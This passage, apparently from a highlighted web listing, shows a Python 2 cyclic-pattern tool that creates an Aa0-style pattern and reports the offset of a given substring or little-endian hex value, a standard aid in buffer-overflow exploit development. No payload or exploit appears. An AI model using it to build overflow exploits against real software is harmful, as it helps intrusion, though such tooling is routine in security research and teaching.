class="string">"6Oo7Oo8Oo9Op0Op1Op2Op3Op4Op5Op6Op7Op8Op9Oq0Oq1Oq2Oq3Oq4Oq5Oq6Oq7Oq8Oq9Or0Or1Or2O"</span></span><br><span class="line"><span class="string">"r3Or4Or5Or6Or7Or8Or9Os0Os1Os2Os3Os4Os5Os6Os7Os8Os9Ot0Ot1Ot2Ot3Ot4Ot5Ot6Ot7Ot8Ot9"</span></span><br><span class="line"><span class="string">"Ou0Ou1Ou2Ou3Ou4Ou5Ou6Ou7Ou8Ou9Ov0Ov1Ov2Ov3Ov4Ov5Ov6Ov7Ov8Ov9Ow0Ow1Ow2Ow3Ow4Ow5Ow"</span></span><br><span class="line"><span class="string">"6Ow7Ow8Ow9Ox0Ox1Ox2Ox3Ox4Ox5Ox6Ox7Ox8Ox9Oy0Oy1Oy2Oy3Oy4Oy5Oy6Oy7Oy8Oy9Oz0Oz1Oz2O"</span></span><br><span class="line"><span class="string">"z3Oz4Oz5Oz6Oz7Oz8Oz9Pa0Pa1Pa2Pa3Pa4Pa5Pa6Pa7Pa8Pa9Pb0Pb1Pb2Pb3Pb4Pb5Pb6Pb7Pb8Pb9"</span></span><br><span class="line"><span class="string">"Pc0Pc1Pc2Pc3Pc4Pc5Pc6Pc7Pc8Pc9Pd0Pd1Pd2Pd3Pd4Pd5Pd6Pd7Pd8Pd9Pe0Pe1Pe2Pe3Pe4Pe5Pe"</span></span><br><span class="line"><span class="string">"6Pe7Pe8Pe9Pf0Pf1Pf2Pf3Pf4Pf5Pf6Pf7Pf8Pf9Pg0Pg1Pg2Pg3Pg4Pg5Pg6Pg7Pg8Pg9Ph0Ph1Ph2P"</span></span><br><span class="line"><span class="string">"h3Ph4Ph5Ph6Ph7Ph8Ph9Pi0Pi1Pi2Pi3Pi4Pi5Pi6Pi7Pi8Pi9Pj0Pj1Pj2Pj3Pj4Pj5Pj6Pj7Pj8Pj9"</span></span><br><span class="line"><span class="string">"Pk0Pk1Pk2Pk3Pk4Pk5Pk6Pk7Pk8Pk9Pl0Pl1Pl2Pl3Pl4Pl5Pl6Pl7Pl8Pl9Pm0Pm1Pm2Pm3Pm4Pm5Pm"</span></span><br><span class="line"><span class="string">"6Pm7Pm8Pm9Pn0Pn1Pn2Pn3Pn4Pn5Pn6Pn7Pn8Pn9Po0Po1Po2Po3Po4Po5Po6Po7Po8Po9Pp0Pp1Pp2P"</span></span><br><span class="line"><span class="string">"p3Pp4Pp5Pp6Pp7Pp8Pp9Pq0Pq1Pq2Pq3Pq4Pq5Pq6Pq7Pq8Pq9Pr0Pr1Pr2Pr3Pr4Pr5Pr6Pr7Pr8Pr9"</span></span><br><span class="line"><span class="string">"Ps0Ps1Ps2Ps3Ps4Ps5Ps6Ps7Ps8Ps9Pt0Pt1Pt2Pt3Pt4Pt5Pt6Pt7Pt8Pt9Pu0Pu1Pu2Pu3Pu4Pu5Pu"</span></span><br><span class="line"><span class="string">"6Pu7Pu8Pu9Pv0Pv1Pv2Pv3Pv4Pv5Pv6Pv7Pv8Pv9Pw0Pw1Pw2Pw3Pw4Pw5Pw6Pw7Pw8Pw9Px0Px1Px2P"</span></span><br><span class="line"><span class="string">"x3Px4Px5Px6Px7Px8Px9Py0Py1Py2Py3Py4Py5Py6Py7Py8Py9Pz0Pz1Pz2Pz3Pz4Pz5Pz6Pz7Pz8Pz9"</span></span><br><span class="line"><span class="string">"Qa0Qa1Qa2Qa3Qa4Qa5Qa6Qa7Qa8Qa9Qb0Qb1Qb2Qb3Qb4Qb5Qb6Qb7Qb8Qb9Qc0Qc1Qc2Qc3Qc4Qc5Qc"</span></span><br><span class="line"><span class="string">"6Qc7Qc8Qc9Qd0Qd1Qd2Qd3Qd4Qd5Qd6Qd7Qd8Qd9Qe0Qe1Qe2Qe3Qe4Qe5Qe6Qe7Qe8Qe9Qf0Qf1Qf2Q"</span></span><br><span class="line"><span class="string">"f3Qf4Qf5Qf6Qf7Qf8Qf9Qg0Qg1Qg2Qg3Qg4Qg5Qg6Qg7Qg8Qg9Qh0Qh1Qh2Qh3Qh4Qh5Qh6Qh7Qh8Qh9"</span></span><br><span class="line"><span class="string">"Qi0Qi1Qi2Qi3Qi4Qi5Qi6Qi7Qi8Qi9Qj0Qj1Qj2Qj3Qj4Qj5Qj6Qj7Qj8Qj9Qk0Qk1Qk2Qk3Qk4Qk5Qk"</span></span><br><span class="line"><span class="string">"6Qk7Qk8Qk9Ql0Ql1Ql2Ql3Ql4Ql5Ql6Ql7Ql8Ql9Qm0Qm1Qm2Qm3Qm4Qm5Qm6Qm7Qm8Qm9Qn0Qn1Qn2Q"</span></span><br><span class="line"><span class="string">"n3Qn4Qn5Qn6Qn7Qn8Qn9Qo0Qo1Qo2Qo3Qo4Qo5Qo6Qo7Qo8Qo9Qp0Qp1Qp2Qp3Qp4Qp5Qp6Qp7Qp8Qp9"</span></span><br><span class="line"><span class="string">"Qq0Qq1Qq2Qq3Qq4Qq5Qq6Qq7Qq8Qq9Qr0Qr1Qr2Qr3Qr4Qr5Qr6Qr7Qr8Qr9Qs0Qs1Qs2Qs3Qs4Qs5Qs"</span></span><br><span class="line"><span class="string">"6Qs7Qs8Qs9Qt0Qt1Qt2Qt3Qt4Qt5Qt6Qt7Qt8Qt9Qu0Qu1Qu2Qu3Qu4Qu5Qu6Qu7Qu8Qu9Qv0Qv1Qv2Q"</span></span><br><span class="line"><span class="string">"v3Qv4Qv5Qv6Qv7Qv8Qv9Qw0Qw1Qw2Qw3Qw4Qw5Qw6Qw7Qw8Qw9Qx0Qx1Qx2Qx3Qx4Qx5Qx6Qx7Qx8Qx9"</span></span><br><span class="line"><span class="string">"Qy0Qy1Qy2Qy3Qy4Qy5Qy6Qy7Qy8Qy9Qz0Qz1Qz2Qz3Qz4Qz5Qz6Qz7Qz8Qz9Ra0Ra1Ra2Ra3Ra4Ra5Ra"</span></span><br><span class="line"><span class="string">"6Ra7Ra8Ra9Rb0Rb1Rb2Rb3Rb4Rb5Rb6Rb7Rb8Rb9Rc0Rc1Rc2Rc3Rc4Rc5Rc6Rc7Rc8Rc9Rd0Rd1Rd2R"</span></span><br><span class="line"><span class="string">"d3Rd4Rd5Rd6Rd7Rd8Rd9Re0Re1Re2Re3Re4Re5Re6Re7Re8Re9Rf0Rf1Rf2Rf3Rf4Rf5Rf6Rf7Rf8Rf9"</span></span><br><span class="line"><span class="string">"Rg0Rg1Rg2Rg3Rg4Rg5Rg6Rg7Rg8Rg9Rh0Rh1Rh2Rh3Rh4Rh5Rh6Rh7Rh8Rh9Ri0Ri1Ri2Ri3Ri4Ri5Ri"</span></span><br><span class="line"><span class="string">"6Ri7Ri8Ri9Rj0Rj1Rj2Rj3Rj4Rj5Rj6Rj7Rj8Rj9Rk0Rk1Rk2Rk3Rk4Rk5Rk6Rk7Rk8Rk9Rl0Rl1Rl2R"</span></span><br><span class="line"><span class="string">"l3Rl4Rl5Rl6Rl7Rl8Rl9Rm0Rm1Rm2Rm3Rm4Rm5Rm6Rm7Rm8Rm9Rn0Rn1Rn2Rn3Rn4Rn5Rn6Rn7Rn8Rn9"</span></span><br><span class="line"><span class="string">"Ro0Ro1Ro2Ro3Ro4Ro5Ro6Ro7Ro8Ro9Rp0Rp1Rp2Rp3Rp4Rp5Rp6Rp7Rp8Rp9Rq0Rq1Rq2Rq3Rq4Rq5Rq"</span></span><br><span class="line"><span class="string">"6Rq7Rq8Rq9Rr0Rr1Rr2Rr3Rr4Rr5Rr6Rr7Rr8Rr9Rs0Rs1Rs2Rs3Rs4Rs5Rs6Rs7Rs8Rs9Rt0Rt1Rt2R"</span></span><br><span class="line"><span class="string">"t3Rt4Rt5Rt6Rt7Rt8Rt9Ru0Ru1Ru2Ru3Ru4Ru5Ru6Ru7Ru8Ru9Rv0Rv1Rv2Rv3Rv4Rv5Rv6Rv7Rv8Rv9"</span></span><br><span class="line"><span class="string">"Rw0Rw1Rw2Rw3Rw4Rw5Rw6Rw7Rw8Rw9Rx0Rx1Rx2Rx3Rx4Rx5Rx6Rx7Rx8Rx9Ry0Ry1Ry2Ry3Ry4Ry5Ry"</span></span><br><span class="line"><span class="string">"6Ry7Ry8Ry9Rz0Rz1Rz2Rz3Rz4Rz5Rz6Rz7Rz8Rz9Sa0Sa1Sa2Sa3Sa4Sa5Sa6Sa7Sa8Sa9Sb0Sb1Sb2S"</span></span><br><span class="line"><span class="string">"b3Sb4Sb5Sb6Sb7Sb8Sb9Sc0Sc1Sc2Sc3Sc4Sc5Sc6Sc7Sc8Sc9Sd0Sd1Sd2Sd3Sd4Sd5Sd6Sd7Sd8Sd9"</span></span><br><span class="line"><span class="string">"Se0Se1Se2Se3Se4Se5Se6Se7Se8Se9Sf0Sf1Sf2Sf3Sf4Sf5Sf6Sf7Sf8Sf9Sg0Sg1Sg2Sg3Sg4Sg5Sg"</span></span><br><span class="line"><span class="string">"6Sg7Sg8Sg9Sh0Sh1Sh2Sh3Sh4Sh5Sh6Sh7Sh8Sh9Si0Si1Si2Si3Si4Si5Si6Si7Si8Si9Sj0Sj1Sj2S"</span></span><br><span class="line"><span class="string">"j3Sj4Sj5Sj6Sj7Sj8Sj9Sk0Sk1Sk2Sk3Sk4Sk5Sk6Sk7Sk8Sk9Sl0Sl1Sl2Sl3Sl4Sl5Sl6Sl7Sl8Sl9"</span></span><br><span class="line"><span class="string">"Sm0Sm1Sm2Sm3Sm4Sm5Sm6Sm7Sm8Sm9Sn0Sn1Sn2Sn3Sn4Sn5Sn6Sn7Sn8Sn9So0So1So2So3So4So5So"</span></span><br><span class="line"><span class="string">"6So7So8So9Sp0Sp1Sp2Sp3Sp4Sp5Sp6Sp7Sp8Sp9Sq0Sq1Sq2Sq3Sq4Sq5Sq6Sq7Sq8Sq9Sr0Sr1Sr2S"</span></span><br><span class="line"><span class="string">"r3Sr4Sr5Sr6Sr7Sr8Sr9Ss0Ss1Ss2Ss3Ss4Ss5Ss6Ss7Ss8Ss9St0St1St2St3St4St5St6St7St8St9"</span></span><br><span class="line"><span class="string">"Su0Su1Su2Su3Su4Su5Su6Su7Su8Su9Sv0Sv1Sv2Sv3Sv4Sv5Sv6Sv7Sv8Sv9Sw0Sw1Sw2Sw3Sw4Sw5Sw"</span></span><br><span class="line"><span class="string">"6Sw7Sw8Sw9Sx0Sx1Sx2Sx3Sx4Sx5Sx6Sx7Sx8Sx9Sy0Sy1Sy2Sy3Sy4Sy5Sy6Sy7Sy8Sy9Sz0Sz1Sz2S"</span></span><br><span class="line"><span class="string">"z3Sz4Sz5Sz6Sz7Sz8Sz9Ta0Ta1Ta2Ta3Ta4Ta5Ta6Ta7Ta8Ta9Tb0Tb1Tb2Tb3Tb4Tb5Tb6Tb7Tb8Tb9"</span></span><br><span class="line"><span class="string">"Tc0Tc1Tc2Tc3Tc4Tc5Tc6Tc7Tc8Tc9Td0Td1Td2Td3Td4Td5Td6Td7Td8Td9Te0Te1Te2Te3Te4Te5Te"</span></span><br><span class="line"><span class="string">"6Te7Te8Te9Tf0Tf1Tf2Tf3Tf4Tf5Tf6Tf7Tf8Tf9Tg0Tg1Tg2Tg3Tg4Tg5Tg6Tg7Tg8Tg9Th0Th1Th2T"</span></span><br><span class="line"><span class="string">"h3Th4Th5Th6Th7Th8Th9Ti0Ti1Ti2Ti3Ti4Ti5Ti6Ti7Ti8Ti9Tj0Tj1Tj2Tj3Tj4Tj5Tj6Tj7Tj8Tj9"</span></span><br><span class="line"><span class="string">"Tk0Tk1Tk2Tk3Tk4Tk5Tk6Tk7Tk8Tk9Tl0Tl1Tl2Tl3Tl4Tl5Tl6Tl7Tl8Tl9Tm0Tm1Tm2Tm3Tm4Tm5Tm"</span></span><br><span class="line"><span class="string">"6Tm7Tm8Tm9Tn0Tn1Tn2Tn3Tn4Tn5Tn6Tn7Tn8Tn9To0To1To2To3To4To5To6To7To8To9Tp0Tp1Tp2T"</span></span><br><span class="line"><span class="string">"p3Tp4Tp5Tp6Tp7Tp8Tp9Tq0Tq1Tq2Tq3Tq4Tq5Tq6Tq7Tq8Tq9Tr0Tr1Tr2Tr3Tr4Tr5Tr6Tr7Tr8Tr9"</span></span><br><span class="line"><span class="string">"Ts0Ts1Ts2Ts3Ts4Ts5Ts6Ts7Ts8Ts9Tt0Tt1Tt2Tt3Tt4Tt5Tt6Tt7Tt8Tt9Tu0Tu1Tu2Tu3Tu4Tu5Tu"</span></span><br><span class="line"><span class="string">"6Tu7Tu8Tu9Tv0Tv1Tv2Tv3Tv4Tv5Tv6Tv7Tv8Tv9Tw0Tw1Tw2Tw3Tw4Tw5Tw6Tw7Tw8Tw9Tx0Tx1Tx2T"</span></span><br><span class="line"><span class="string">"x3Tx4Tx5Tx6Tx7Tx8Tx9Ty0Ty1Ty2Ty3Ty4Ty5Ty6Ty7Ty8Ty9Tz0Tz1Tz2Tz3Tz4Tz5Tz6Tz7Tz8Tz9"</span></span><br><span class="line"><span class="string">"Ua0Ua1Ua2Ua3Ua4Ua5Ua6Ua7Ua8Ua9Ub0Ub1Ub2Ub3Ub4Ub5Ub6Ub7Ub8Ub9Uc0Uc1Uc2Uc3Uc4Uc5Uc"</span></span><br><span class="line"><span class="string">"6Uc7Uc8Uc9Ud0Ud1Ud2Ud3Ud4Ud5Ud6Ud7Ud8Ud9Ue0Ue1Ue2Ue3Ue4Ue5Ue6Ue7Ue8Ue9Uf0Uf1Uf2U"</span></span><br><span class="line"><span class="string">"f3Uf4Uf5Uf6Uf7Uf8Uf9Ug0Ug1Ug2Ug3Ug4Ug5Ug6Ug7Ug8Ug9Uh0Uh1Uh2Uh3Uh4Uh5Uh6Uh7Uh8Uh9"</span></span><br><span class="line"><span class="string">"Ui0Ui1Ui2Ui3Ui4Ui5Ui6Ui7Ui8Ui9Uj0Uj1Uj2Uj3Uj4Uj5Uj6Uj7Uj8Uj9Uk0Uk1Uk2Uk3Uk4Uk5Uk"</span></span><br><span class="line"><span class="string">"6Uk7Uk8Uk9Ul0Ul1Ul2Ul3Ul4Ul5Ul6Ul7Ul8Ul9Um0Um1Um2Um3Um4Um5Um6Um7Um8Um9Un0Un1Un2U"</span></span><br><span class="line"><span class="string">"n3Un4Un5Un6Un7Un8Un9Uo0Uo1Uo2Uo3Uo4Uo5Uo6Uo7Uo8Uo9Up0Up1Up2Up3Up4Up5Up6Up7Up8Up9"</span></span><br><span class="line"><span class="string">"Uq0Uq1Uq2Uq3Uq4Uq5Uq6Uq7Uq8Uq9Ur0Ur1Ur2Ur3Ur4Ur5Ur6Ur7Ur8Ur9Us0Us1Us2Us3Us4Us5Us"</span></span><br><span class="line"><span class="string">"6Us7Us8Us9Ut0Ut1Ut2Ut3Ut4Ut5Ut6Ut7Ut8Ut9Uu0Uu1Uu2Uu3Uu4Uu5Uu6Uu7Uu8Uu9Uv0Uv1Uv2U"</span></span><br><span class="line"><span class="string">"v3Uv4Uv5Uv6Uv7Uv8Uv9Uw0Uw1Uw2Uw3Uw4Uw5Uw6Uw7Uw8Uw9Ux0Ux1Ux2Ux3Ux4Ux5Ux6Ux7Ux8Ux9"</span></span><br><span class="line"><span class="string">"Uy0Uy1Uy2Uy3Uy4Uy5Uy6Uy7Uy8Uy9Uz0Uz1Uz2Uz3Uz4Uz5Uz6Uz7Uz8Uz9Va0Va1Va2Va3Va4Va5Va"</span></span><br><span class="line"><span class="string">"6Va7Va8Va9Vb0Vb1Vb2Vb3Vb4Vb5Vb6Vb7Vb8Vb9Vc0Vc1Vc2Vc3Vc4Vc5Vc6Vc7Vc8Vc9Vd0Vd1Vd2V"</span></span><br><span class="line"><span class="string">"d3Vd4Vd5Vd6Vd7Vd8Vd9Ve0Ve1Ve2Ve3Ve4Ve5Ve6Ve7Ve8Ve9Vf0Vf1Vf2Vf3Vf4Vf5Vf6Vf7Vf8Vf9"</span></span><br><span class="line"><span class="string">"Vg0Vg1Vg2Vg3Vg4Vg5Vg6Vg7Vg8Vg9Vh0Vh1Vh2Vh3Vh4Vh5Vh6Vh7Vh8Vh9Vi0Vi1Vi2Vi3Vi4Vi5Vi"</span></span><br><span class="line"><span class="string">"6Vi7Vi8Vi9Vj0Vj1Vj2Vj3Vj4Vj5Vj6Vj7Vj8Vj9Vk0Vk1Vk2Vk3Vk4Vk5Vk6Vk7Vk8Vk9Vl0Vl1Vl2V"</span></span><br><span class="line"><span class="string">"l3Vl4Vl5Vl6Vl7Vl8Vl9Vm0Vm1Vm2Vm3Vm4Vm5Vm6Vm7Vm8Vm9Vn0Vn1Vn2Vn3Vn4Vn5Vn6Vn7Vn8Vn9"</span></span><br><span class="line"><span class="string">"Vo0Vo1Vo2Vo3Vo4Vo5Vo6Vo7Vo8Vo9Vp0Vp1Vp2Vp3Vp4Vp5Vp6Vp7Vp8Vp9Vq0Vq1Vq2Vq3Vq4Vq5Vq"</span></span><br><span class="line"><span class="string">"6Vq7Vq8Vq9Vr0Vr1Vr2Vr3Vr4Vr5Vr6Vr7Vr8Vr9Vs0Vs1Vs2Vs3Vs4Vs5Vs6Vs7Vs8Vs9Vt0Vt1Vt2V"</span></span><br><span class="line"><span class="string">"t3Vt4Vt5Vt6Vt7Vt8Vt9Vu0Vu1Vu2Vu3Vu4Vu5Vu6Vu7Vu8Vu9Vv0Vv1Vv2Vv3Vv4Vv5Vv6Vv7Vv8Vv9"</span></span><br><span class="line"><span class="string">"Vw0Vw1Vw2Vw3Vw4Vw5Vw6Vw7Vw8Vw9Vx0Vx1Vx2Vx3Vx4Vx5Vx6Vx7Vx8Vx9Vy0Vy1Vy2Vy3Vy4Vy5Vy"</span></span><br><span class="line"><span class="string">"6Vy7Vy8Vy9Vz0Vz1Vz2Vz3Vz4Vz5Vz6Vz7Vz8Vz9Wa0Wa1Wa2Wa3Wa4Wa5Wa6Wa7Wa8Wa9Wb0Wb1Wb2W"</span></span><br><span class="line"><span class="string">"b3Wb4Wb5Wb6Wb7Wb8Wb9Wc0Wc1Wc2Wc3Wc4Wc5Wc6Wc7Wc8Wc9Wd0Wd1Wd2Wd3Wd4Wd5Wd6Wd7Wd8Wd9"</span></span><br><span class="line"><span class="string">"We0We1We2We3We4We5We6We7We8We9Wf0Wf1Wf2Wf3Wf4Wf5Wf6Wf7Wf8Wf9Wg0Wg1Wg2Wg3Wg4Wg5Wg"</span></span><br><span class="line"><span class="string">"6Wg7Wg8Wg9Wh0Wh1Wh2Wh3Wh4Wh5Wh6Wh7Wh8Wh9Wi0Wi1Wi2Wi3Wi4Wi5Wi6Wi7Wi8Wi9Wj0Wj1Wj2W"</span></span><br><span class="line"><span class="string">"j3Wj4Wj5Wj6Wj7Wj8Wj9Wk0Wk1Wk2Wk3Wk4Wk5Wk6Wk7Wk8Wk9Wl0Wl1Wl2Wl3Wl4Wl5Wl6Wl7Wl8Wl9"</span></span><br><span class="line"><span class="string">"Wm0Wm1Wm2Wm3Wm4Wm5Wm6Wm7Wm8Wm9Wn0Wn1Wn2Wn3Wn4Wn5Wn6Wn7Wn8Wn9Wo0Wo1Wo2Wo3Wo4Wo5Wo"</span></span><br><span class="line"><span class="string">"6Wo7Wo8Wo9Wp0Wp1Wp2Wp3Wp4Wp5Wp6Wp7Wp8Wp9Wq0Wq1Wq2Wq3Wq4Wq5Wq6Wq7Wq8Wq9Wr0Wr1Wr2W"</span></span><br><span class="line"><span class="string">"r3Wr4Wr5Wr6Wr7Wr8Wr9Ws0Ws1Ws2Ws3Ws4Ws5Ws6Ws7Ws8Ws9Wt0Wt1Wt2Wt3Wt4Wt5Wt6Wt7Wt8Wt9"</span></span><br><span class="line"><span class="string">"Wu0Wu1Wu2Wu3Wu4Wu5Wu6Wu7Wu8Wu9Wv0Wv1Wv2Wv3Wv4Wv5Wv6Wv7Wv8Wv9Ww0Ww1Ww2Ww3Ww4Ww5Ww"</span></span><br><span class="line"><span class="string">"6Ww7Ww8Ww9Wx0Wx1Wx2Wx3Wx4Wx5Wx6Wx7Wx8Wx9Wy0Wy1Wy2Wy3Wy4Wy5Wy6Wy7Wy8Wy9Wz0Wz1Wz2W"</span></span><br><span class="line"><span class="string">"z3Wz4Wz5Wz6Wz7Wz8Wz9Xa0Xa1Xa2Xa3Xa4Xa5Xa6Xa7Xa8Xa9Xb0Xb1Xb2Xb3Xb4Xb5Xb6Xb7Xb8Xb9"</span></span><br><span class="line"><span class="string">"Xc0Xc1Xc2Xc3Xc4Xc5Xc6Xc7Xc8Xc9Xd0Xd1Xd2Xd3Xd4Xd5Xd6Xd7Xd8Xd9Xe0Xe1Xe2Xe3Xe4Xe5Xe"</span></span><br><span class="line"><span class="string">"6Xe7Xe8Xe9Xf0Xf1Xf2Xf3Xf4Xf5Xf6Xf7Xf8Xf9Xg0Xg1Xg2Xg3Xg4Xg5Xg6Xg7Xg8Xg9Xh0Xh1Xh2X"</span></span><br><span class="line"><span class="string">"h3Xh4Xh5Xh6Xh7Xh8Xh9Xi0Xi1Xi2Xi3Xi4Xi5Xi6Xi7Xi8Xi9Xj0Xj1Xj2Xj3Xj4Xj5Xj6Xj7Xj8Xj9"</span></span><br><span class="line"><span class="string">"Xk0Xk1Xk2Xk3Xk4Xk5Xk6Xk7Xk8Xk9Xl0Xl1Xl2Xl3Xl4Xl5Xl6Xl7Xl8Xl9Xm0Xm1Xm2Xm3Xm4Xm5Xm"</span></span><br><span class="line"><span class="string">"6Xm7Xm8Xm9Xn0Xn1Xn2Xn3Xn4Xn5Xn6Xn7Xn8Xn9Xo0Xo1Xo2Xo3Xo4Xo5Xo6Xo7Xo8Xo9Xp0Xp1Xp2X"</span></span><br><span class="line"><span class="string">"p3Xp4Xp5Xp6Xp7Xp8Xp9Xq0Xq1Xq2Xq3Xq4Xq5Xq6Xq7Xq8Xq9Xr0Xr1Xr2Xr3Xr4Xr5Xr6Xr7Xr8Xr9"</span></span><br><span class="line"><span class="string">"Xs0Xs1Xs2Xs3Xs4Xs5Xs6Xs7Xs8Xs9Xt0Xt1Xt2Xt3Xt4Xt5Xt6Xt7Xt8Xt9Xu0Xu1Xu2Xu3Xu4Xu5Xu"</span></span><br><span class="line"><span class="string">"6Xu7Xu8Xu9Xv0Xv1Xv2Xv3Xv4Xv5Xv6Xv7Xv8Xv9Xw0Xw1Xw2Xw3Xw4Xw5Xw6Xw7Xw8Xw9Xx0Xx1Xx2X"</span></span><br><span class="line"><span class="string">"x3Xx4Xx5Xx6Xx7Xx8Xx9Xy0Xy1Xy2Xy3Xy4Xy5Xy6Xy7Xy8Xy9Xz0Xz1Xz2Xz3Xz4Xz5Xz6Xz7Xz8Xz9"</span></span><br><span class="line"><span class="string">"Ya0Ya1Ya2Ya3Ya4Ya5Ya6Ya7Ya8Ya9Yb0Yb1Yb2Yb3Yb4Yb5Yb6Yb7Yb8Yb9Yc0Yc1Yc2Yc3Yc4Yc5Yc"</span></span><br><span class="line"><span class="string">"6Yc7Yc8Yc9Yd0Yd1Yd2Yd3Yd4Yd5Yd6Yd7Yd8Yd9Ye0Ye1Ye2Ye3Ye4Ye5Ye6Ye7Ye8Ye9Yf0Yf1Yf2Y"</span></span><br><span class="line"><span class="string">"f3Yf4Yf5Yf6Yf7Yf8Yf9Yg0Yg1Yg2Yg3Yg4Yg5Yg6Yg7Yg8Yg9Yh0Yh1Yh2Yh3Yh4Yh5Yh6Yh7Yh8Yh9"</span></span><br><span class="line"><span class="string">"Yi0Yi1Yi2Yi3Yi4Yi5Yi6Yi7Yi8Yi9Yj0Yj1Yj2Yj3Yj4Yj5Yj6Yj7Yj8Yj9Yk0Yk1Yk2Yk3Yk4Yk5Yk"</span></span><br><span class="line"><span class="string">"6Yk7Yk8Yk9Yl0Yl1Yl2Yl3Yl4Yl5Yl6Yl7Yl8Yl9Ym0Ym1Ym2Ym3Ym4Ym5Ym6Ym7Ym8Ym9Yn0Yn1Yn2Y"</span></span><br><span class="line"><span class="string">"n3Yn4Yn5Yn6Yn7Yn8Yn9Yo0Yo1Yo2Yo3Yo4Yo5Yo6Yo7Yo8Yo9Yp0Yp1Yp2Yp3Yp4Yp5Yp6Yp7Yp8Yp9"</span></span><br><span class="line"><span class="string">"Yq0Yq1Yq2Yq3Yq4Yq5Yq6Yq7Yq8Yq9Yr0Yr1Yr2Yr3Yr4Yr5Yr6Yr7Yr8Yr9Ys0Ys1Ys2Ys3Ys4Ys5Ys"</span></span><br><span class="line"><span class="string">"6Ys7Ys8Ys9Yt0Yt1Yt2Yt3Yt4Yt5Yt6Yt7Yt8Yt9Yu0Yu1Yu2Yu3Yu4Yu5Yu6Yu7Yu8Yu9Yv0Yv1Yv2Y"</span></span><br><span class="line"><span class="string">"v3Yv4Yv5Yv6Yv7Yv8Yv9Yw0Yw1Yw2Yw3Yw4Yw5Yw6Yw7Yw8Yw9Yx0Yx1Yx2Yx3Yx4Yx5Yx6Yx7Yx8Yx9"</span></span><br><span class="line"><span class="string">"Yy0Yy1Yy2Yy3Yy4Yy5Yy6Yy7Yy8Yy9Yz0Yz1Yz2Yz3Yz4Yz5Yz6Yz7Yz8Yz9Za0Za1Za2Za3Za4Za5Za"</span></span><br><span class="line"><span class="string">"6Za7Za8Za9Zb0Zb1Zb2Zb3Zb4Zb5Zb6Zb7Zb8Zb9Zc0Zc1Zc2Zc3Zc4Zc5Zc6Zc7Zc8Zc9Zd0Zd1Zd2Z"</span></span><br><span class="line"><span class="string">"d3Zd4Zd5Zd6Zd7Zd8Zd9Ze0Ze1Ze2Ze3Ze4Ze5Ze6Ze7Ze8Ze9Zf0Zf1Zf2Zf3Zf4Zf5Zf6Zf7Zf8Zf9"</span></span><br><span class="line"><span class="string">"Zg0Zg1Zg2Zg3Zg4Zg5Zg6Zg7Zg8Zg9Zh0Zh1Zh2Zh3Zh4Zh5Zh6Zh7Zh8Zh9Zi0Zi1Zi2Zi3Zi4Zi5Zi"</span></span><br><span class="line"><span class="string">"6Zi7Zi8Zi9Zj0Zj1Zj2Zj3Zj4Zj5Zj6Zj7Zj8Zj9Zk0Zk1Zk2Zk3Zk4Zk5Zk6Zk7Zk8Zk9Zl0Zl1Zl2Z"</span></span><br><span class="line"><span class="string">"l3Zl4Zl5Zl6Zl7Zl8Zl9Zm0Zm1Zm2Zm3Zm4Zm5Zm6Zm7Zm8Zm9Zn0Zn1Zn2Zn3Zn4Zn5Zn6Zn7Zn8Zn9"</span></span><br><span class="line"><span class="string">"Zo0Zo1Zo2Zo3Zo4Zo5Zo6Zo7Zo8Zo9Zp0Zp1Zp2Zp3Zp4Zp5Zp6Zp7Zp8Zp9Zq0Zq1Zq2Zq3Zq4Zq5Zq"</span></span><br><span class="line"><span class="string">"6Zq7Zq8Zq9Zr0Zr1Zr2Zr3Zr4Zr5Zr6Zr7Zr8Zr9Zs0Zs1Zs2Zs3Zs4Zs5Zs6Zs7Zs8Zs9Zt0Zt1Zt2Z"</span></span><br><span class="line"><span class="string">"t3Zt4Zt5Zt6Zt7Zt8Zt9Zu0Zu1Zu2Zu3Zu4Zu5Zu6Zu7Zu8Zu9Zv0Zv1Zv2Zv3Zv4Zv5Zv6Zv7Zv8Zv9"</span></span><br><span class="line"><span class="string">"Zw0Zw1Zw2Zw3Zw4Zw5Zw6Zw7Zw8Zw9Zx0Zx1Zx2Zx3Zx4Zx5Zx6Zx7Zx8Zx9Zy0Zy1Zy2Zy3Zy4Zy5Zy"</span></span><br><span class="line"><span class="string">"6Zy7Zy8Zy9Zz0Zz1Zz2Zz3Zz4Zz5Zz6Zz7Zz8Zz9"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_error</span><span class="params">(msg)</span>:</span></span><br><span class="line">sys.stderr.write(os.linesep * <span class="number">2</span> + <span class="string">"ERROR: "</span> + msg + os.linesep * <span class="number">3</span>)</span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bare_words</span><span class="params">()</span>:</span></span><br><span class="line">string = <span class="string">" "</span>.join(sys.argv[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"The used string: =&gt;"</span> + string + <span class="string">"&lt;="</span></span><br><span class="line"><span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_help</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> sys.argv[<span class="number">0</span>] + <span class="string">" create &lt;int&gt;"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\tReturns a pattern of &lt;int&gt; chars."</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> sys.argv[<span class="number">0</span>] + <span class="string">" offset &lt;str&gt; [size &lt;int&gt;]"</span></span><br><span class="line"><span class="keyword">print</span> (</span><br><span class="line"><span class="string">"\tReturns the offset for the provided argument &lt;str&gt;. Must be at least "</span></span><br><span class="line"><span class="string">"three chars for non ambiguous match. May be a hex value. The conversion"</span></span><br><span class="line"><span class="string">"is done automatically for little endian architectures (ie: x86). This "</span></span><br><span class="line"><span class="string">"basically means that the string obtained from hex conversion is "</span></span><br><span class="line"><span class="string">"reversed. WARNING: The hex decoding is skipped for valid hex values "</span></span><br><span class="line"><span class="string">"that are part of the buffer itself as the hex decoding is a fallback "</span></span><br><span class="line"><span class="string">"measure. Always use the 0x prefix in order to force the hex decoding."</span></span><br><span class="line"><span class="string">""</span> + os.linesep + <span class="string">""</span></span><br><span class="line"><span class="string">"\tFor patterns longer than 20280 chars you must provide the optional "</span></span><br><span class="line"><span class="string">"argument size in order to receive all the offsets for the Aa0 pattern."</span></span><br><span class="line">)</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 